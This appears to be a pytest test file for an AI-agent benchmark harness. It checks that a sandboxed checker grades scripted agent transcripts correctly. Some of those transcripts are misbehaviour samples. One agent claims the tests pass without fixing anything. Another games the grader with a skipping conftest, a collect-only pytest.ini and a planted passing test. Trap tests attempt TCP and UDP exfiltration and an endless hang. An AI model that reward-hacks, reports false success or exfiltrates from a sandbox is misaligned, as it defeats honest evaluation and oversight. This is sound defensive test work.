"""`bench run --level T3` end-to-end against the fake: ticket Harness 05.

The deterministic agent loop (max 12 steps) over the three synthetic mini-repos,
with the checker running REAL pytest in the sandbox subprocess — hard timeout, no
network, isolated cwd, an allowlist environment. The model transcripts are
scripted by the fake: a transcript that fixes the bug passes its checker, one
that does not fails — however confidently it claims the tests pass.
"""

from __future__ import annotations

import itertools
import json
import re
import time

from test_dry_run import run_cli, with_pricing

from ocharness import fixtures_t3
from ocharness import sandbox as sandbox_mod
from ocharness.fixtures import build, fixture_hash
from ocharness.schema import validate_batch_line, validate_request_line

T3_NAMES = tuple(fixtures_t3.WORKLOADS)

_RE_STEP = re.compile(r"This is action (\d+) of (\d+)")


def prepare(tmp_path) -> str:
    pricing = with_pricing(tmp_path)
    assert (
        run_cli(tmp_path, "dry-run", "--level", "T3", "--reps", "1", "--pricing-dir", pricing)[0]
        == 0
    )
    return pricing


def run_t3(tmp_path, *extra) -> tuple[int, str, str]:
    return run_cli(tmp_path, "run", "--level", "T3", "--settle-s", "0", *extra)


def read_jsonl(tmp_path, dirname, pattern) -> list[dict]:
    files = sorted((tmp_path / dirname).glob(pattern))
    assert len(files) == 1, f"expected exactly one {pattern} in {dirname}/"
    return [json.loads(l) for l in files[0].read_text(encoding="utf-8").splitlines() if l.strip()]


def read_requests(tmp_path) -> list[dict]:
    return read_jsonl(tmp_path, "runs", "requests-*.jsonl")


def read_batches(tmp_path) -> list[dict]:
    return read_jsonl(tmp_path, "batches", "batches-*.jsonl")


# ---- scripted agent transcripts -------------------------------------------------


def exploration(workload: str) -> list[dict]:
    """The scripted agent looks before it edits: one cheap discovery action."""
    if workload == "debugging":
        return [{"action": "read_file", "path": "tests/test_sensors.py"}]
    if workload == "multi_file":
        return [{"action": "list_dir", "path": "."}]
    return [{"action": "read_file", "path": "kilnlog/report.py"}]


def scripted_actions(workload: str) -> list[dict]:
    return (
        exploration(workload)
        + fixtures_t3.fix_steps(workload)
        + [{"action": "run_tests"}, {"action": "finish", "summary": "every test passes"}]
    )


def correct_reply(prompt: str) -> str:
    """The scripted agent that actually fixes the task, then verifies and finishes."""
    workload = fixtures_t3.workload_of(prompt)
    acciones = scripted_actions(workload)
    paso = int(_RE_STEP.search(prompt).group(1))
    if paso <= len(acciones):
        return json.dumps(acciones[paso - 1])
    return json.dumps({"action": "finish", "summary": "every test passes"})


def confident_reply(prompt: str) -> str:
    """The agent that claims success without fixing anything: a no-op patch,
    then `finish` claiming the tests pass — the checker must land it as a fail."""
    paso = int(_RE_STEP.search(prompt).group(1))
    if paso == 1:
        return json.dumps(
            {
                "action": "apply_patch",
                "path": "README.md",
                "search": "THE BUG IS HERE",
                "replace": "fixed",
            }
        )
    return json.dumps({"action": "finish", "summary": "all tests pass now"})


def looping_reply(_prompt: str) -> str:
    """An agent that never finishes: the 12-action cap must end the loop."""
    return json.dumps({"action": "read_file", "path": "conftest.py"})


def sloppy_reply(prompt: str) -> str:
    """A turn of prose before the fix: the invalid step is spent, the loop recovers."""
    workload = fixtures_t3.workload_of(prompt)
    acciones = scripted_actions(workload)
    paso = int(_RE_STEP.search(prompt).group(1))
    if paso == 1:
        return "I will fix the failing test suite now."
    if paso <= len(acciones) + 1:
        return json.dumps(acciones[paso - 2])
    return json.dumps({"action": "finish", "summary": "every test passes"})


# ---- the tests ------------------------------------------------------------------


def test_full_t3_slate_scripted_fixes_pass_the_real_pytest_checker(tmp_path, fake_cli):
    fake_cli.reply_for = correct_reply
    prepare(tmp_path)
    code, out, err = run_t3(tmp_path, "--reps", "1")
    assert code == 0, out or err
    requests = read_requests(tmp_path)
    batches = read_batches(tmp_path)
    assert len(batches) == 3 * 3 and len(requests) == 3 * 3
    chats = [c for c in fake_cli.calls if c["path"] == "/api/chat"]
    # One billed chat per loop step across the slate; no warmup, no retry.
    assert len(chats) == sum(len(r["steps"]) for r in requests)
    for r in requests:
        validate_request_line(r)
        # The scripted fix makes the REAL pytest run in the sandbox pass.
        assert r["checker"] == "pass", (r["workload"], r["sandbox"]["tail"][-400:])
        assert r["steps"][-1]["action"] == "finish" and r["steps"][-1]["action_ok"]
        assert 1 <= len(r["steps"]) <= fixtures_t3.MAX_STEPS
        # The line's totals derive from the per-step evidence it carries.
        assert r["tok_in"] == sum(p["tok_in"] for p in r["steps"])
        assert r["tok_out"] == sum(p["tok_out"] for p in r["steps"])
        assert r["chunks"] == sum(p["chunks"] for p in r["steps"])
        assert r["fixture_hash"] == fixture_hash(build("T3", r["workload"], 1))
        sandbox = r["sandbox"]
        assert sandbox["returncode"] == 0 and sandbox["timed_out"] is False
        assert "OLLAMA_API_KEY" not in sandbox["env_keys"]  # the sandbox env is an allowlist
    assert {r["workload"] for r in requests} == set(T3_NAMES)
    for b in batches:
        validate_batch_line(b)
        assert b["notes"] == ""  # clean cells: the checkers graded, nothing aborted


def test_the_loop_records_tokens_per_step_inside_the_bracketed_batch(tmp_path, fake_cli):
    fake_cli.reply_for = correct_reply
    fake_cli.counts_for = lambda prompt, seed: (max(1, len(prompt) // 4), 12)
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    requests = read_requests(tmp_path)
    assert len(requests) == 3
    for r in requests:
        tok_ins = [p["tok_in"] for p in r["steps"]]
        assert all(a < b for a, b in itertools.pairwise(tok_ins))  # each step re-sends the log
        # The bracket reconciles the meter against the accepted step chats.
        batches = read_batches(tmp_path)
        batch = next(b for b in batches if b["batch_id"] == r["batch_id"])
        contados = batch["request_counts"]["count_check"][r["model"]] - batch["request_counts"][
            "pre"
        ].get(r["model"], 0)
        assert contados == len(r["steps"])
        esperado = len(r["steps"]) * fake_cli.ticks_per_request * 0.1
        assert abs(batch["dpp_session"] - esperado) <= 0.1


def test_a_confident_non_fix_fails_the_checker(tmp_path, fake_cli):
    """'the tests pass' is not evidence: the sandbox's own pytest run decides."""
    fake_cli.reply_for = confident_reply
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    requests = read_requests(tmp_path)
    assert len(requests) == 3
    assert all(r["checker"] == "fail" for r in requests)
    for r in requests:
        assert r["sandbox"]["returncode"] != 0 and not r["sandbox"]["timed_out"]
        assert r["steps"][-1]["action"] == "finish"  # the claim was made, and ignored
        assert r["http"] == 200  # billed attempts, graded as failures


def test_twelve_actions_end_the_loop_without_finish(tmp_path, fake_cli):
    fake_cli.reply_for = looping_reply
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    requests = read_requests(tmp_path)
    assert len(requests) == 3
    for r in requests:
        assert len(r["steps"]) == fixtures_t3.MAX_STEPS  # the cap ended the loop
        assert all(p["action"] == "read_file" for p in r["steps"])
        assert r["checker"] == "fail"  # the checker still grades the untouched repo
        assert r["sandbox"]["returncode"] != 0


def test_an_unparsable_reply_spends_the_step_but_not_the_task(tmp_path, fake_cli):
    fake_cli.reply_for = sloppy_reply
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    for r in read_requests(tmp_path):
        primero = r["steps"][0]
        assert primero["action"] == "invalid" and not primero["action_ok"]
        assert len(r["steps"]) == len(scripted_actions(r["workload"])) + 1
        assert r["checker"] == "pass"  # the loop recovered and fixed the repo


def test_a_network_escape_is_blocked_inside_the_sandbox(tmp_path, fake_cli):
    fake_cli.reply_for = trap_reply(EXFIL_TEST)
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    requests = read_requests(tmp_path)
    assert len(requests) == 3
    trampa = next(r for r in requests if r["workload"] == "debugging")
    assert trampa["checker"] == "fail"
    sandbox = trampa["sandbox"]
    assert sandbox["returncode"] == 1 and not sandbox["timed_out"]
    assert "network access is blocked inside the sandbox" in sandbox["tail"]
    assert "OLLAMA_API_KEY" not in sandbox["env_keys"]
    # The credential probe the same agent wrote ran and passed.
    assert "PASSED test_trap.py::test_the_sandbox_leaks_no_credentials" in sandbox["tail"]


def test_a_hanging_suite_is_killed_by_the_hard_timeout(tmp_path, fake_cli, monkeypatch):
    monkeypatch.setattr(sandbox_mod, "SANDBOX_TIMEOUT_S", 2.0)
    fake_cli.reply_for = trap_reply(HANG_TEST)
    prepare(tmp_path)
    t0 = time.monotonic()
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    assert time.monotonic() - t0 < 60  # the sandbox killed the hang, it did not wait
    requests = read_requests(tmp_path)
    trampa = next(r for r in requests if r["workload"] == "debugging")
    assert trampa["checker"] == "fail"
    sandbox = trampa["sandbox"]
    assert sandbox["timed_out"] is True
    assert sandbox["returncode"] == -9  # SIGKILLed process group
    assert sandbox["duration_s"] >= 2.0


def test_a_datagram_escape_is_blocked_inside_the_sandbox(tmp_path, fake_cli):
    """Exfiltration without a connect: an unconnected UDP sendto raises too."""
    fake_cli.reply_for = trap_reply(EXFIL_UDP_TEST)
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    trampa = next(r for r in read_requests(tmp_path) if r["workload"] == "debugging")
    assert trampa["checker"] == "fail"
    assert "network access is blocked inside the sandbox" in trampa["sandbox"]["tail"]


def test_a_gamed_working_copy_cannot_pass_the_checker(tmp_path, fake_cli):
    """pytest.ini, a skipping tests/conftest.py, and a planted passing test are
    pytest's config surface: the graded copy is rebuilt without them, so the
    fixture's own tests decide and the unfixed bug still fails."""
    fake_cli.reply_for = gaming_reply
    prepare(tmp_path)
    assert run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")[0] == 0
    trampa = next(r for r in read_requests(tmp_path) if r["workload"] == "debugging")
    assert trampa["checker"] == "fail"  # the gamed suite never reached the graded copy
    sandbox = trampa["sandbox"]
    assert sandbox["returncode"] != 0 and not sandbox["timed_out"]
    # The graded run executed the fixture's own suite: its bug symptom shows.
    assert "test_one_mean_per_possible_window_position" in sandbox["tail"]


def test_grading_is_hermetic_to_config_above_the_base(tmp_path, fake_cli):
    """A hostile pytest config or conftest above --base never reaches the graded
    run: the task's own parent pins pytest's config, so the fixture's own suite
    decides even with the bug unfixed."""
    base = tmp_path / "operator-base"
    base.mkdir()
    (base / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\naddopts = '--collect-only'\n", encoding="utf-8"
    )
    (base / "conftest.py").write_text(
        "def pytest_collection_modifyitems(items):\n"
        "    raise RuntimeError('ancestor conftest reached the graded run')\n",
        encoding="utf-8",
    )
    fake_cli.reply_for = confident_reply  # nothing gets fixed: every cell must fail
    pricing = with_pricing(tmp_path)  # absolute, so --base does not move it
    assert (
        run_cli(base, "dry-run", "--level", "T3", "--reps", "1", "--pricing-dir", pricing)[0] == 0
    )
    code, out, err = run_cli(
        base, "run", "--level", "T3", "--settle-s", "0", "--reps", "1", "--pricing-dir", pricing
    )
    assert code == 0, out or err
    requests = read_jsonl(base, "runs", "requests-*.jsonl")
    assert len(requests) == 9  # the full T3 slate: 3 workloads x 3 models
    assert all(r["checker"] == "fail" for r in requests), [
        (r["workload"], r["sandbox"]["tail"][-300:]) for r in requests if r["checker"] != "fail"
    ]
    # The ancestor conftest never executed inside a graded run.
    assert all("ancestor conftest" not in r["sandbox"]["tail"] for r in requests)


def test_seeds_stay_inside_the_api_decodable_range():
    from ocharness.fixtures import seed

    semillas = {
        seed(w, m, rep, i)
        for w in T3_NAMES
        for m in ("kimi-k2.7-code", "glm-5.3-flash", "deepseek-v4-pro")
        for rep in range(1, 6)
        for i in range(3)
    }
    assert all(0 <= s < 2**63 for s in semillas)


def test_a_sandbox_that_never_reaches_pytest_aborts_the_batch(tmp_path, fake_cli, monkeypatch):
    """The READY handshake gates the grade: a harness misconfiguration aborts
    the batch loudly with null verdicts instead of publishing every cell as a
    model failure."""

    def _sin_sandbox(task_dir, fixture_files):
        return {  # what run_pytest returns when the subprocess died before pytest
            "argv": [],
            "cwd": str(task_dir),
            "env_keys": [],
            "returncode": 1,
            "timed_out": False,
            "sandbox_ok": False,
            "duration_s": 0.0,
            "output_sha256": "0" * 64,
            "tail": "No module named ocharness",
        }

    monkeypatch.setattr(sandbox_mod, "run_checker", _sin_sandbox)
    fake_cli.reply_for = correct_reply
    prepare(tmp_path)
    code, _out, err = run_t3(tmp_path, "--model", "glm-5.3-flash", "--reps", "1")
    assert code == 1
    assert "sandbox never ran pytest" in err and "Traceback" not in err
    requests = read_requests(tmp_path)
    assert all(r["checker"] is None for r in requests)  # billed evidence kept, ungraded
    manifiesto = json.loads((tmp_path / "runs" / "manifest-T3.json").read_text(encoding="utf-8"))
    assert all(e["status"] == "aborted" for e in manifiesto["batches"].values())


def gaming_reply(prompt: str) -> str:
    """A scripted agent that games instead of working: it writes a pytest.ini
    that collects nothing, a tests/conftest.py that skips everything, and a
    planted passing test — then finishes claiming success."""
    acciones = [
        {
            "action": "write_file",
            "path": "pytest.ini",
            "content": "[pytest]\naddopts = --collect-only\n",
        },
        {
            "action": "write_file",
            "path": "tests/conftest.py",
            "content": "import pytest\n\n\ndef pytest_runtest_setup(item):\n    pytest.skip('gamed')\n",
        },
        {
            "action": "write_file",
            "path": "tests/test_planted.py",
            "content": "def test_planted_pass():\n    assert True\n",
        },
    ]
    workload = fixtures_t3.workload_of(prompt)
    paso = int(_RE_STEP.search(prompt).group(1))
    if workload == "debugging":
        if paso <= len(acciones):
            return json.dumps(acciones[paso - 1])
        return json.dumps({"action": "finish", "summary": "the suite now passes"})
    return correct_reply(prompt)


def trap_reply(contenido: str):
    """A scripted agent that plants one extra test file at the repo root — in
    the debugging repo only; the other two workloads run the correct
    transcripts. (A root-level test file is carried into the graded copy, so
    the trap's code really executes inside the sandbox.)"""

    def _reply(prompt: str) -> str:
        workload = fixtures_t3.workload_of(prompt)
        paso = int(_RE_STEP.search(prompt).group(1))
        if workload == "debugging":
            if paso == 1:
                return json.dumps(
                    {"action": "write_file", "path": "test_trap.py", "content": contenido}
                )
            return json.dumps({"action": "finish", "summary": "all tests pass"})
        return correct_reply(prompt)

    return _reply


EXFIL_TEST = (
    "import os\n\n\ndef test_exfiltrate():\n"
    "    import socket\n\n"
    "    socket.create_connection(('example.com', 80), timeout=5)\n\n\n"
    "def test_the_sandbox_leaks_no_credentials():\n"
    "    assert 'OLLAMA_API_KEY' not in os.environ\n"
)

EXFIL_UDP_TEST = (
    "import socket\n\n\ndef test_exfiltrate_udp():\n"
    "    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n"
    "    s.sendto(b'exfiltrate', ('10.255.255.1', 53))\n"
)

HANG_TEST = "import time\n\n\ndef test_hang():\n    while True:\n        time.sleep(0.5)\n"
